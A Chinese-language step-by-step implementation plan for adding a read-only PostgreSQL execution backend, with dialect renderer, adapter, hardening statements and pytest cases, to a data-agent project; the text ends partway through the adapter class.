# PostgreSQL 执行后端支持 实施计划（二十二期）

> 本计划交 dev-executing-plans 逐任务执行；步骤用 `- [ ]` 勾选跟踪。
> 任务确认清单见 `../tasks/2026-10-26-postgres-backend-tasks.md`。

**Goal:** 在二十一期双后端架构上新增 PostgreSQL 执行后端（`DB_BACKEND=postgres`），全量对齐 MySQL 交付模式：引擎 adapter + 编译方言 + PG 建仓 + parity 回归 + CI 门禁 + 评测冒烟。

**Architecture:** 双轨接入（`exec/engine/postgres_adapter.py` 执行引擎 + `compiler/dialect/postgres.py` 方言渲染器），两处工厂注册表化（if-elif → dict + 惰性 import），探索层视图安装钩子按方法存在性分发；护栏框架与连接池引擎无关、零改动。

**Tech Stack:** psycopg3（`psycopg[binary]>=3.2,<4`）、sqlglot（DDL 转译 + 方言解析）、既有 exec.guards 护栏框架。

**Spec:** [docs/designs/2026-10-26-postgres-backend-design.md](../designs/2026-10-26-postgres-backend-design.md)（决策 D1-D17；本计划从规格出发论证，执行者需同时读两者）

## Global Constraints

- golden 评测锚定 DuckDB 方言；DuckDB / MySQL 两个 renderer 的任何输出**逐字节不变**（golden 锚点保护）。
- LLM 产出的 SQL 永不直接执行；一切执行只发生在治理管道内（只读 + RLS + 资源上限）。
- 确定性三原则：种子 42、`AS_OF_DATE=2025-12-31`、单 rng 顺序消费；三后端逐行同数据。
- 依赖 pin：`psycopg[binary]>=3.2,<4`（写入 requirements.txt 并附选型理由注释）；兼容基线 PostgreSQL >= 13；CI 锚定 `postgres:16`。
- fail-closed：连接加固失败即抛 `SecurityError`，严禁弱配置连接进管道；扫描预检不可计量返回 `(0, False)` 由上层 warning 留痕，严禁静默当成 0 行放行。
- 所有新增/修改代码的 docstring 与行内注释使用简体中文（专有名词保留英文）；测试函数名英文；Git 提交信息遵循 `feat:/fix:/docs:/test:` 前缀 + 简体中文描述。
- 每个任务收尾时 `black --check .`、`ruff check .` 必须绿（全量 `pytest -q` 在 Task 10 收尾统一跑，中间任务跑各自子集）。
- 本地开发环境为 conda `dataagent`（Python 3.12）；执行命令一律 `conda run -n dataagent --no-capture-output python ...`（activate 失败会静默回退 base）。
- PG parity 测试本地自动跳过（`POSTGRES_TEST_HOST` 未配置），由 CI `postgres-parity` job 承担真实验证（用户已确认此模式）。

## Review Focus

规格隐含、但没有任何任务的测试直接覆盖的输入类别/失效模式，前五条（每条已挂到 owning task 的测试）：

1. **statement_timeout 触发路径**：服务端超时产生 SQLSTATE 57014 → 必须归一为 `QueryTimeoutError`（而非裸 `SqlExecutionError`）→ Task 3 单测锁定 `exc.sqlstate` 属性读取；服务级由 CI parity 兜底。
2. **PG EXPLAIN 文本格式漂移**（版本演进不再渲染 actual 段）→ 必须返回 `(0, False)` 走 warning 留痕退化，不得当成 0 行熔断或静默放行 → Task 3 单测用无 actual 样例锁定。
3. **`standard_conforming_strings` 被部署环境关闭**（反斜杠恢复转义语义，转义口径漂移）→ harden 必须显式 pin `on`，且 PG 转义器不翻倍反斜杠（翻了反而注入多余字符）→ Task 3 加固基线单测 + Task 2 转义单测共同锁定。
4. **spine/comparison 步长字面量出现四个枚举之外的形态**（编译器演进引入新粒度而 PG 转译点未跟进）→ 必须显式 `CompileError`，严禁静默拼接非法 SQL → Task 2 单测锁定。
5. **无列名 DataFrame / NaN/NaT 混入灌数通道**（`_bulk_insert` 用元组行构造 DataFrame，columns 为 0..n 整数）→ 必须位置模式 INSERT 且空值清洗为 None → Task 3 单测锁定（MySQL 先例 CI 实锤过的坑）。

---

### Task 1: 配置与依赖基座（POSTGRES_* 配置组 + psycopg3）

**Files:**
- Modify: `config/settings.py:41`（MYSQL_* 组之后插入）
- Modify: `requirements.txt`（文件末尾追加）
- Modify: `.env.example`（MYSQL 组之后插入）

**Interfaces:**
- Produces: `settings.POSTGRES_HOST/PORT/USER/PASSWORD/DATABASE`（Task 3 adapter 缺省 DSN 消费）；psycopg3 可导入（Task 3/8 消费）。

- [ ] **Step 1: settings.py 增加 POSTGRES_* 配置组**

在 `MYSQL_DATABASE` 行（settings.py:41）之后插入：

```python
# PostgreSQL 执行后端连接配置（DB_BACKEND=postgres 时生效，二十二期 spec §6）
# 运行时查询用只读账号（部署要求 GRANT SELECT ON ALL TABLES IN SCHEMA public）；
# 建仓（python -m mock.init_postgres）复用本组配置但要求账号具备 CREATE/INSERT/DROP 权限
POSTGRES_HOST: str = os.getenv("POSTGRES_HOST", "127.0.0.1")
POSTGRES_PORT: int = int(os.getenv("POSTGRES_PORT", "5432"))
POSTGRES_USER: str = os.getenv("POSTGRES_USER", "dataagent_ro")
POSTGRES_PASSWORD: str = os.getenv("POSTGRES_PASSWORD", "")
POSTGRES_DATABASE: str = os.getenv("POSTGRES_DATABASE", "gmall")
```

- [ ] **Step 2: requirements.txt 追加 psycopg3**

在文件末尾（pymysql 条目之后）追加：

```
# PostgreSQL 执行后端（二十二期）：psycopg3 生态标准驱动（psycopg2 已进入仅维护
# 模式）；二进制 wheel 全平台免编译，核心保留纯 Python 回退；按 SQLSTATE 解析异常
# （spec D1/D4）。兼容基线 PostgreSQL >= 13（spec §8.1 版本演进跟随策略——升级前
# 须跑全量回归与 tests/test_pg_backend_parity.py）
psycopg[binary]>=3.2,<4
```

- [ ] **Step 3: .env.example 追加 POSTGRES 组**

在 `MYSQL_DATABASE=gmall` 行之后插入：

```
# PostgreSQL 执行后端（二十二期）：DB_BACKEND=postgres 时生效；运行时只读账号需
# GRANT SELECT ON ALL TABLES IN SCHEMA public，建仓另用可写账号
POSTGRES_HOST=127.0.0.1
POSTGRES_PORT=5432
POSTGRES_USER=dataagent_ro
POSTGRES_PASSWORD=
POSTGRES_DATABASE=gmall
```

- [ ] **Step 4: 安装依赖到 dataagent 环境**

```bash
conda run -n dataagent --no-capture-output python -m pip install "psycopg[binary]>=3.2,<4"
```

- [ ] **Step 5: 验证**

Run: `conda run -n dataagent --no-capture-output python -c "import psycopg; from config import settings; print(psycopg.__version__, settings.POSTGRES_DATABASE)"`
Expected: 打印 psycopg 版本（>= 3.2）与 `gmall`，无异常。

- [ ] **Step 6: Lint 与提交**

```bash
black --check . && ruff check .
git add config/settings.py requirements.txt .env.example
git commit -m "feat: PostgreSQL 后端配置基座（POSTGRES_* 配置组 + psycopg3 依赖）"
```

---

### Task 2: 方言层——date_add 原语 + PostgresRenderer + 注册表化

**Files:**
- Create: `compiler/dialect/postgres.py`
- Modify: `compiler/dialect/base.py`（协议新增 date_add，docstring 7→8 原语）
- Modify: `compiler/dialect/duckdb.py`（新增 date_add，输出不变）
- Modify: `compiler/dialect/mysql.py`（新增 date_add，输出不变）
- Modify: `compiler/dialect/__init__.py`（注册表化）
- Modify: `compiler/sql_compiler.py:551`（date_add 改走 renderer）
- Modify: `compiler/dialect/base.py` docstring 中"MySQL 实现见 mysql.py"补 postgres.py
- Test: `tests/compiler/test_dialect.py`（新增 Postgres 用例 + date_add 锚点保护）

**Interfaces:**
- Consumes: `compiler.errors.CompileError`、`compiler.dialect.base.DialectRenderer` 协议（既有）。
- Produces: `PostgresRenderer`（`name="postgres"`，8 原语齐全）；`DialectRenderer.date_add(expr: str, interval: str) -> str`（三方言实现）；`get_renderer()` 支持 `"postgres"`；Task 8 parity 测试经 `_compile_dsl(dsl, "postgres")` 消费。

- [ ] **Step 1: 写失败测试**

在 `tests/compiler/test_dialect.py` 末尾追加：

```python
# --------------------------------------------------------------------------- #
# PostgreSQL 方言渲染器（二十二期 spec D7/D8/D17）
# --------------------------------------------------------------------------- #


class TestPostgresRenderer:
    def test_quotes_are_double_quotes(self):
        from compiler.dialect.postgres import PostgresRenderer

        r = PostgresRenderer()
        assert r.quote_ident("gmv") == '"gmv"'
        assert r.quote_ident('a"b') == '"a""b"'
        assert r.quote_column("f", "order_id") == "f.order_id"

    def test_backslash_not_doubled_in_string_escape(self):
        """spec D7：PG 在 standard_conforming_strings=on 下反斜杠即字面量，翻倍反而引入多余字符。"""
        from compiler.dialect.postgres import PostgresRenderer

        r = PostgresRenderer()
        assert r.escape_string_literal("a\\b") == "'a\\b'"
        assert r.escape_string_literal("a'b") == "'a''b'"

    def test_timestamp_literal_native(self):
        from compiler.dialect.postgres import PostgresRenderer

        r = PostgresRenderer()
        assert (
            r.timestamp_literal(datetime(2025, 1, 1, 0, 0, 0)) == "TIMESTAMP '2025-01-01 00:00:00'"
        )
        assert r.timestamp_literal("2025-01-01") == "TIMESTAMP '2025-01-01'"

    def test_date_trunc_native_all_granularities(self):
        from compiler.dialect.postgres import PostgresRenderer

        r = PostgresRenderer()
        for g in ("day", "week", "month", "quarter"):
            assert r.date_trunc(g, "f.order_time") == f"date_trunc('{g}', f.order_time)"

    def test_spine_uses_generate_series_with_pg_interval(self):
        """spec D8：generate_series 原生集合函数，步长转译为 PG INTERVAL 字面量。"""
        from compiler.dialect.postgres import PostgresRenderer

        r = PostgresRenderer()
        body = r.spine_cte_sql(
            "day", "2025-01-01 00:00:00", "2025-01-03 00:00:00", "INTERVAL 1 DAY"
        )
        assert body == (
            'SELECT gs AS "day" FROM generate_series(TIMESTAMP \'2025-01-01 00:00:00\', '
            "TIMESTAMP '2025-01-03 00:00:00', INTERVAL '1 day') AS gs"
        )
        assert r.with_keyword() == "WITH"

    def test_spine_rejects_unknown_interval_form(self):
        """Review Focus #4：步长字面量超出编译器枚举形态即 CompileError，严禁静默拼接。"""
        import pytest

        from compiler.dialect.postgres import PostgresRenderer
        from compiler.errors import CompileError

        with pytest.raises(CompileError, match="INTERVAL"):
            PostgresRenderer().spine_cte_sql(
                "day", "2025-01-01 00:00:00", "2025-01-03 00:00:00", "INTERVAL 2 FORTNIGHT"
            )

    def test_date_add_additive_form(self):
        """spec D17：PG 无 date_add 函数，以加法等价 + INTERVAL 字面量转译。"""
        from compiler.dialect.postgres import PostgresRenderer

        r = PostgresRenderer()
        assert r.date_add("f.order_time", "INTERVAL 1 YEAR") == "f.order_time + INTERVAL '1 year'"
        assert r.date_add("f.order_time", "INTERVAL 3 MONTH") == "f.order_time + INTERVAL '3 month'"


def test_date_add_byte_identical_on_anchored_dialects():
    """golden 锚点保护：DuckDB/MySQL 的 date_add 渲染与迁移前内联产物逐字节一致。"""
    from compiler.dialect.duckdb import DuckDbRenderer
    from compiler.dialect.mysql import MySqlRenderer

    assert DuckDbRenderer().date_add("d.ts", "INTERVAL 1 YEAR") == "date_add(d.ts, INTERVAL 1 YEAR)"
    assert (
        MySqlRenderer().date_add("d.ts", "INTERVAL 1 MONTH") == "date_add(d.ts, INTERVAL 1 MONTH)"
    )


def test_get_renderer_supports_postgres():
    """注册表化后 postgres 取得 PostgresRenderer（name 与 sqlglot 方言名一致）。"""
    import config.settings as settings

    old = settings.SQL_DIALECT
    settings.SQL_DIALECT = "postgres"
    try:
        assert get_renderer().name == "postgres"
    finally:
        settings.SQL_DIALECT = old


class TestCompilePostgresDialect:
    """端到端：PostgreSQL 方言编译产物结构断言（sqlglot postgres 可解析即语法合法）。"""

    def test_month_groupby_uses_native_date_trunc(self):
        import sqlglot

        sql = _compile_dsl(_month_gmv_dsl(), "postgres")
        assert "date_trunc('month'" in sql
        sqlglot.parse_one(sql, read="postgres")

    def test_fill_gaps_compiles_to_generate_series(self):
        import sqlglot

        sql = _compile_dsl(_fill_gaps_dsl(), "postgres")
        assert sql.startswith("WITH __spine")
        assert "generate_series" in sql
        assert "INTERVAL '1 day'" in sql
        sqlglot.parse_one(sql, read="postgres")

    def test_comparison_uses_additive_date_shift(self):
        """comparison 配对在 PG 走加法平移（无 date_add 函数依赖，spec D17）。"""
        import sqlglot

        dsl = _month_gmv_dsl()
        dsl["time_filter"]["comparison"] = "yoy"
        sql = _compile_dsl(dsl, "postgres")
        assert "date_add(" not in sql
        assert "+ INTERVAL '1 year'" in sql
        sqlglot.parse_one(sql, read="postgres")
```

- [ ] **Step 2: 跑测试确认失败**

Run: `conda run -n dataagent --no-capture-output python -m pytest tests/compiler/test_dialect.py -q`
Expected: FAIL/ERROR（`compiler.dialect.postgres` 模块不存在；`DuckDbRenderer` 无 `date_add` 属性）。

- [ ] **Step 3: 协议与两个既有 renderer 增加 date_add（输出逐字节不变）**

`compiler/dialect/base.py`：docstring 中 `"""SQL 方言渲染器协议（7 个原语方法）。"""` 改为 `"""SQL 方言渲染器协议（8 个原语方法）。"""`，并在 `date_trunc` 方法之后插入：

```python
    def date_add(self, expr: str, interval: str) -> str:
        """时间列平移（comparison 配对对齐；interval 为编译器 INTERVAL 字面量）。

        spec D17：DuckDB/MySQL 有同名 date_add 函数；PostgreSQL 无，以
        `{expr} + INTERVAL` 加法等价式实现。
        """
        ...
```

同文件模块 docstring 末句 `MySQL 实现见 mysql.py。` 改为 `MySQL 实现见 mysql.py；PostgreSQL 实现见 postgres.py。`

`compiler/dialect/duckdb.py` 在 `date_trunc` 方法之后插入：

```python
    def date_add(self, expr: str, interval: str) -> str:
        # DuckDB 原生 date_add(timestamp, interval)——与迁移前内联渲染逐字节一致（golden 锚点）
        return f"date_add({expr}, {interval})"
```

`compiler/dialect/mysql.py` 在 `date_trunc` 方法之后插入：

```python
    def date_add(self, expr: str, interval: str) -> str:
        # MySQL DATE_ADD 同名兼容；小写渲染与迁移前内联产物逐字节一致（golden 锚点）
        return f"date_add({expr}, {interval})"
```

- [ ] **Step 4: 新建 compiler/dialect/postgres.py**

```python
"""PostgreSQL 方言渲染器（二十二期 spec D7/D8/D17）。

口径要点：
- 标识符双引号（PG 标准）；时间字面量 TIMESTAMP '...'（PG 原生）；
- date_trunc 四档全原生（week 周一锚定，与 DuckDB date_trunc / MySQL WEEKDAY
  等价式口径一致）；
- spine 用 generate_series 原生集合函数——无递归深度问题（MySQL 递归 CTE +
  cte_max_recursion_depth 的负担在 PG 不存在）；
- 字符串转义仅单引号翻倍、不翻倍反斜杠：PG 在 standard_conforming_strings=on
  （9.1+ 默认，adapter.harden 显式 pin）下反斜杠即字面量，翻倍反而引入多余
  字符（spec D7）；
- INTERVAL 字面量转译：编译器产出的 INTERVAL 1 DAY 形态（DuckDB/MySQL 兼容）
  在 PG 非法，统一转 INTERVAL '1 day'——spine 步长与 comparison date_add
  对齐共用同一转译点，未知形态显式 CompileError（spec D17）。
"""

from __future__ import annotations

import re
from datetime import date, datetime

from compiler.errors import CompileError

# 编译器侧 INTERVAL 字面量形态（sql_compiler 硬编码：spine 四处步长 +
# comparison 对齐两类）：INTERVAL <n> <UNIT>；PG 语法要求 INTERVAL '<n> <unit>'
_INTERVAL_RE = re.compile(r"INTERVAL\s+(\d+)\s+(DAY|WEEK|MONTH|YEAR)", re.IGNORECASE)


def pg_interval_literal(step: str) -> str:
    """编译器 INTERVAL 字面量 -> PG 字面量（'INTERVAL 1 DAY' -> "INTERVAL '1 day'"）。"""
    m = _INTERVAL_RE.fullmatch(step.strip())
    if m is None:
        raise CompileError(f"不支持的 INTERVAL 字面量形态: {step!r}")
    return f"INTERVAL '{m.group(1)} {m.group(2).lower()}'"


class PostgresRenderer:
    """PostgreSQL 方言渲染器（DialectRenderer 协议实现）。"""

    name = "postgres"

    def quote_ident(self, name: str) -> str:
        # 双引号包裹 + 内部双引号翻倍，杜绝标识符注入（与 DuckDB 同 rationale）
        return '"' + str(name).replace('"', '""') + '"'

    def quote_column(self, alias: str, column: str) -> str:
        # 裸限定列：别名来自编译器内部生成、物理列名经 catalog 白名单登记，无注入面
        return f"{alias}.{column}"

    def timestamp_literal(self, value: datetime | date | str) -> str:
        if isinstance(value, datetime):
            return f"TIMESTAMP '{value.strftime('%Y-%m-%d %H:%M:%S')}'"
        return f"TIMESTAMP '{value}'"

    def date_trunc(self, granularity: str, expr: str) -> str:
        # PG 原生 date_trunc（week 周一锚定）；granularity 来自契约枚举四档
        return f"date_trunc('{granularity}', {expr})"

    def spine_cte_sql(self, alias: str, start: str, end: str, step: str) -> str:
        # generate_series 原生集合函数：端点闭区间口径与 DuckDB generate_series
        # 一致（sql_compiler 侧 end_incl 已按粒度回退到末桶起点）
        a = self.quote_ident(alias)
        return (
            f"SELECT gs AS {a} FROM generate_series(TIMESTAMP '{start}', TIMESTAMP '{end}', "
            f"{pg_interval_literal(step)}) AS gs"
        )

    def with_keyword(self) -> str:
        # spine 非递归（generate_series），无需 RECURSIVE
        return "WITH"

    def escape_string_literal(self, value: str) -> str:
        # 仅单引号翻倍；反斜杠在 standard_conforming_strings=on（harden 显式 pin）
        # 下是字面量，翻倍会引入多余字符——语义确定性由会话加固保证（spec D7）
        return "'" + str(value).replace("'", "''") + "'"

    def date_add(self, expr: str, interval: str) -> str:
        # PG 无 date_add 函数（spec D17）：加法等价式 + INTERVAL 字面量转译
        return f"{expr} + {pg_interval_literal(interval)}"


__all__ = ["PostgresRenderer", "pg_interval_literal"]
```

- [ ] **Step 5: compiler/dialect/__init__.py 注册表化**

整文件替换为：

```python
"""编译方言注册中心（二十一期 spec D4；二十二期注册表化）：按 SQL_DIALECT/DB_BACKEND 提供 renderer。

每次调用现取（不缓存实例、动态读 settings）：测试 monkeypatch
settings.SQL_DIALECT / DB_BACKEND 需即时生效；renderer 无状态。
"""

from __future__ import annotations

from collections.abc import Callable
from typing import Any

from compiler.dialect.base import DialectRenderer

__all__ = ["DialectRenderer", "get_renderer", "resolve_dialect"]


def resolve_dialect() -> str:
    """SQL_DIALECT 显式配置优先，缺省跟随 DB_BACKEND（取值即 sqlglot 方言名）。"""
    from config import settings

    if settings.SQL_DIALECT:
        return settings.SQL_DIALECT
    return settings.DB_BACKEND


def _lazy_factory(module: str, attr: str) -> Callable[[], Any]:
    """惰性工厂：调用时才 import 模块并实例化（保持包间导入次序与既有行为）。"""

    def _make() -> Any:
        import importlib

        return getattr(importlib.import_module(module), attr)()

    return _make


# 方言注册表（二十二期）：新增方言 = 在此登记一行；报错文案由 keys 动态生成
_RENDERER_FACTORIES: dict[str, Callable[[], Any]] = {
    "duckdb": _lazy_factory("compiler.dialect.duckdb", "DuckDbRenderer"),
    "mysql": _lazy_factory("compiler.dialect.mysql", "MySqlRenderer"),
    "postgres": _lazy_factory("compiler.dialect.postgres", "PostgresRenderer"),
}


def get_renderer() -> DialectRenderer:
    """取当前方言渲染器（duckdb / mysql / postgres）。"""
    from compiler.errors import CompileError  # 惰性导入：errors 不反向依赖本包

    name = resolve_dialect()
    factory = _RENDERER_FACTORIES.get(name)
    if factory is None:
        raise CompileError(f"未知 SQL_DIALECT: {name!r}（仅支持 {', '.join(_RENDERER_FACTORIES)}）")
    return factory()
```

- [ ] **Step 6: sql_compiler.py comparison 改走 renderer**

`compiler/sql_compiler.py:551`：

```python
        time_expr_prev = f"date_add({trunc_expr}, {align_interval})"
```

改为：

```python
        time_expr_prev = get_renderer().date_add(trunc_expr, align_interval)
```

- [ ] **Step 7: 跑测试确认通过**

Run: `conda run -n dataagent --no-capture-output python -m pytest tests/compiler/ -q`
Expected: PASS（含既有 duckdb/mysql 用例与 golden 快照相关编译用例全绿——duckdb/mysql 输出逐字节不变的直接证据）。

- [ ] **Step 8: golden 锚点回归（编译面）**

Run: `conda run -n dataagent --no-capture-output python -m pytest tests/ -q -k "golden or snapshot or dialect"`
Expected: PASS。若此处出现任何 duckdb/mysql 编译产物 diff，立即停止并排查 date_add 改动——golden 锚点红线。

- [ ] **Step 9: Lint 与提交**

```bash
black --check . && ruff check .
git add compiler/dialect/ compiler/sql_compiler.py tests/compiler/test_dialect.py
git commit -m "feat: PostgreSQL 方言渲染器 + date_add 方言原语化 + 方言注册表化（二十二期 D7/D8/D17）"
```

---

### Task 3: 引擎层——PostgresAdapter + 注册表化

**Files:**
- Create: `exec/engine/postgres_adapter.py`
- Modify: `exec/engine/__init__.py`（注册表化）
- Modify: `exec/engine/base.py`（模块 docstring duckdb/mysql 补 postgres）
- Test: `tests/engine/test_postgres_adapter.py`（新建）

**Interfaces:**
- Consumes: `settings.POSTGRES_*`（Task 1）、`exec.engine.normalize.normalize_cell`、`exec.engine.watchdog.run_with_timeout`、`exec.errors.QueryTimeoutError/SqlExecutionError`、`security.views.build_secure_views`（均既有）。
- Produces: `PostgresAdapter`（`name="postgres"`、`dialect="postgres"`，EngineAdapter 7 方法 + `install_secure_views(conn, principal) -> dict[str, str]`）；模块级 `HARDEN_STATEMENTS(timeout_ms=None) -> tuple[str, ...]`、`parse_pg_scan_rows(plan_text) -> tuple[int, bool]`、`PG_QUERY_CANCELED_SQLSTATE = "57014"`；`get_adapter()` 支持 `"postgres"`。Task 5/6/8/9 消费。

- [ ] **Step 1: 写失败测试**

新建 `tests/engine/test_postgres_adapter.py`：

```python
"""PostgreSQL adapter 纯逻辑测试：DSN 构造 / 加固语句 / 异常归一 / 计划解析（不连服务）。

服务级行为（连接/加固/超时/池复用）由 tests/test_pg_backend_parity.py
承担（POSTGRES_TEST_* 环境变量驱动，本地未配置时 skip、CI postgres-parity 门禁执行）。
"""

from __future__ import annotations

import pytest

from exec.engine.postgres_adapter import (
    HARDEN_STATEMENTS,
    PG_QUERY_CANCELED_SQLSTATE,
    PostgresAdapter,
    parse_pg_scan_rows,
)
from exec.errors import QueryTimeoutError, SqlExecutionError


def test_dsn_defaults_from_settings(monkeypatch):
    import config.settings as settings

    monkeypatch.setattr(settings, "POSTGRES_HOST", "db.local")
    monkeypatch.setattr(settings, "POSTGRES_PORT", 5433)
    monkeypatch.setattr(settings, "POSTGRES_USER", "ro")
    monkeypatch.setattr(settings, "POSTGRES_PASSWORD", "pw")
    monkeypatch.setattr(settings, "POSTGRES_DATABASE", "gmall")
    dsn = PostgresAdapter()._dsn
    assert dsn == {
        "host": "db.local",
        "port": 5433,
        "user": "ro",
        "password": "pw",
        "database": "gmall",
    }


def test_names_align_with_sqlglot_dialect():
    """name/dialect 与 sqlglot 方言名一致（护栏 AST 解析复用）。"""
    assert PostgresAdapter.name == "postgres"
    assert PostgresAdapter.dialect == "postgres"


def test_harden_statements_cover_security_baseline():
    """加固四要素（spec D3/D6）缺一不可——纯文本锁定。"""
    joined = " ".join(HARDEN_STATEMENTS(30000))
    assert "default_transaction_read_only = on" in joined
    assert "standard_conforming_strings = on" in joined  # Review Focus #3：转义口径 pin
    assert "lock_timeout = 10000" in joined
    assert "statement_timeout = 30000" in joined


def test_engine_error_timeout_57014():
    """Review Focus #1：statement_timeout 触发（SQLSTATE 57014）归一为 QueryTimeoutError。"""
    import psycopg

    assert PG_QUERY_CANCELED_SQLSTATE == "57014"
    err = psycopg.errors.QueryCanceled("canceling statement due to statement timeout")
    assert err.sqlstate == PG_QUERY_CANCELED_SQLSTATE
    assert isinstance(PostgresAdapter().engine_error(err), QueryTimeoutError)


def test_engine_error_generic_wrapped():
    """普通 psycopg 异常包装为 SqlExecutionError（喂自愈链路）。"""
    import psycopg

    err = psycopg.OperationalError("connection refused")
    norm = PostgresAdapter().engine_error(err)
    assert isinstance(norm, SqlExecutionError)
    assert "OperationalError" in str(norm)


def test_engine_error_foreign_returns_none():
    """非 psycopg 异常返回 None：调用方原样重抛（不得吞）。"""
    assert PostgresAdapter().engine_error(ValueError("x")) is None


# --------------------------------------------------------------------------- #
# EXPLAIN ANALYZE 解析（spec D5 / Review Focus #2）：样例文本锁定格式，不连服务
# --------------------------------------------------------------------------- #

# PostgreSQL 16 EXPLAIN ANALYZE 真实输出样例（版本敏感见 spec §8.1）
_PG_PLAN_SAMPLE = (
    "Aggregate  (cost=36.60..36.61 rows=1 width=8) (actual time=12.345..12.346 rows=1 loops=1)\n"
    "  ->  Seq Scan on order_detail  (cost=0.00..32.50 rows=1200 width=6) "
    "(actual time=0.012..9.876 rows=1180 loops=1)\n"
    "Planning Time: 0.123 ms\n"
    "Execution Time: 12.456 ms\n"
)

_PG_PLAN_NO_ACTUAL = "Seq Scan on order_detail  (cost=0.00..32.50 rows=1200 width=6)\n"


def test_parse_pg_scan_rows_takes_max_actual():
    rows, measurable = parse_pg_scan_rows(_PG_PLAN_SAMPLE)
    assert rows == 1180 and measurable is True


def test_parse_pg_scan_rows_ignores_cost_estimate():
    """cost 段估算行数（rows=1200 > actual 1180）绝不混入实际口径。"""
    rows, _ = parse_pg_scan_rows(_PG_PLAN_SAMPLE)
    assert rows == 1180


def test_parse_pg_scan_rows_not_measurable_without_actual():
    """Review Focus #2：无 actual 段（格式变更/版本演进）：(0, False) 交上层 warning 留痕。"""
    rows, measurable = parse_pg_scan_rows(_PG_PLAN_NO_ACTUAL)
    assert rows == 0 and measurable is False


# --------------------------------------------------------------------------- #
# 灌数通道（spec D13 / Review Focus #5）：占位符/标识符引用/空值清洗
# --------------------------------------------------------------------------- #


class _CaptureCursor:
    def __init__(self, captured: dict):
        self._captured = captured

    def executemany(self, sql, data):
        self._captured["sql"] = sql
        self._captured["data"] = data

    def __enter__(self):
        return self

    def __exit__(self, *exc_info):
        return False


class _CaptureConn:
    def __init__(self):
        self.captured: dict = {}

    def cursor(self):
        return _CaptureCursor(self.captured)


def test_insert_dataframe_quoted_identifiers_and_nan_to_none():
    import pandas as pd

    conn = _CaptureConn()
    df = pd.DataFrame({"a": [1.0, float("nan")], "b": ["x", "y"]})
    n = PostgresAdapter().insert_dataframe(conn, "t", df)
    assert n == 2
    assert conn.captured["data"] == [(1.0, "x"), (None, "y")]
    assert conn.captured["sql"] == 'INSERT INTO "t" ("a", "b") VALUES (%s, %s)'


def test_insert_dataframe_positional_mode_for_unnamed_df():
    """无列名 DataFrame（元组行构造，columns=0..n）：位置对应 INSERT 无列子句。"""
    import pandas as pd

    conn = _CaptureConn()
    unnamed = pd.DataFrame([(1, "x"), (2, "y")])
    PostgresAdapter().insert_dataframe(conn, "t", unnamed)
    assert conn.captured["sql"] == 'INSERT INTO "t" VALUES (%s, %s)'


def test_insert_dataframe_nat_to_none():
    """datetime 列空值 NaT -> None（与 MySQL 口径一致：空值直插 TIMESTAMP 列报错）。"""
    import pandas as pd

    conn = _CaptureConn()
    df = pd.DataFrame({"t": [pd.Timestamp("2025-01-01"), pd.NaT]})
    PostgresAdapter().insert_dataframe(conn, "t", df)
    assert conn.captured["data"][1][0] is None


# --------------------------------------------------------------------------- #
# 注册中心（二十二期注册表化）
# --------------------------------------------------------------------------- #


@pytest.mark.parametrize("backend", ["duckdb", "mysql", "postgres"])
def test_get_adapter_by_backend(backend, monkeypatch):
    """注册中心按后端名取 adapter（mysql/postgres 惰性 import 生效）。"""
    import config.settings as settings
    from exec.engine import get_adapter

    monkeypatch.setattr(settings, "DB_BACKEND", backend)
    assert get_adapter().name == backend
    assert get_adapter(backend).name == backend


def test_get_adapter_rejects_unknown_with_dynamic_names(monkeypatch):
    """未知后端拒绝文案由注册表 keys 动态生成（含 postgres）。"""
    import config.settings as settings
    from exec.engine import get_adapter

    monkeypatch.setattr(settings, "DB_BACKEND", "oracle")
    with pytest.raises(ValueError, match="duckdb, mysql, postgres"):
        get_adapter()
```

- [ ] **Step 2: 跑测试确认失败**

Run: `conda run -n dataagent --no-capture-output python -m pytest tests/engine/test_postgres_adapter.py -q`
Expected: FAIL/ERROR（`exec.engine.postgres_adapter` 不存在；`get_adapter` 不支持 postgres）。

- [ ] **Step 3: 新建 exec/engine/postgres_adapter.py**

```python
"""PostgreSQL 适配器（二十二期 spec D2-D6）：psycopg3 只读执行面。

超时取消（spec D3）：服务端 statement_timeout 为主（连接 options + 会话 SET
双保险），SQLSTATE 57014 归一为 QueryTimeoutError；pg_cancel_backend 方案
已否决（需独立 pid 通道，注入复杂度不值得——与 MySQL KILL QUERY 否决同口径）。

连接加固（spec D6，fail-closed）：default_transaction_read_only /
standard_conforming_strings（转义口径确定性，spec D7）/ lock_timeout /
statement_timeout。扫描预检（spec D5）：EXPLAIN ANALYZE actual 段 rows 口径，
解析不可计量时 warning 留痕跳过（不静默放行也不硬熔断）。

探索层（spec D10）：PostgreSQL 原生支持 CREATE OR REPLACE TEMP VIEW，与
DuckDB 同走 TEMP 视图路线（MySQL 无临时视图故走内联派生表）。
"""

from __future__ import annotations

import re
from typing import Any

from config import settings
from exec.engine.normalize import normalize_cell
from exec.errors import QueryTimeoutError, SqlExecutionError

# PostgreSQL statement_timeout 触发的 SQLSTATE（query_canceled）
PG_QUERY_CANCELED_SQLSTATE = "57014"

# 只认 actual 段的 rows（cost 段的 rows=N 是优化器估算，绝不能混入实际口径）。
# 输出样例（PG 16 树形文本）：
#   Seq Scan on order_detail  (cost=0.00..32.50 rows=1200 width=6)
#     (actual time=0.012..9.876 rows=1180 loops=1)
# 版本敏感：格式随版本演进可能变化（spec §8.1），不可计量时返回 (0, False)
# 由上层 warning 留痕，不得静默当成 0 行放行。
_PG_ACTUAL_ROWS_RE = re.compile(r"\(\s*actual\s+time=[^)]*?\brows=(\d+)", re.IGNORECASE)


def parse_pg_scan_rows(plan_text: str) -> tuple[int, bool]:
    """解析 EXPLAIN ANALYZE 树形文本，返回 (最大 actual rows, 是否可计量)。

    口径与 DuckDB/MySQL 版对齐：取所有算子实际行数的最大值作为"扫描行数"
    预算（多表查询即各基表扫描的最大值）。
    """
    counts = [int(m.group(1)) for m in _PG_ACTUAL_ROWS_RE.finditer(plan_text)]
    if not counts:
        return 0, False
    return max(counts), True


def HARDEN_STATEMENTS(timeout_ms: int | None = None) -> tuple[str, ...]:
    """PostgreSQL 会话加固语句清单（spec D6；顺序执行、fail-closed）。

    作为模块级函数供纯逻辑单测锁定基线（四项缺一不可）。SET 天然幂等，
    无需 DuckDB 式先读回再设。
    """
    t = timeout_ms if timeout_ms is not None else settings.QUERY_TIMEOUT_MS
    return (
        "SET default_transaction_read_only = on",
        "SET standard_conforming_strings = on",
        "SET lock_timeout = 10000",
        f"SET statement_timeout = {int(t)}",
    )


class PostgresAdapter:
    """PostgreSQL 查询执行适配器（EngineAdapter 协议实现）。"""

    name = "postgres"
    dialect = "postgres"

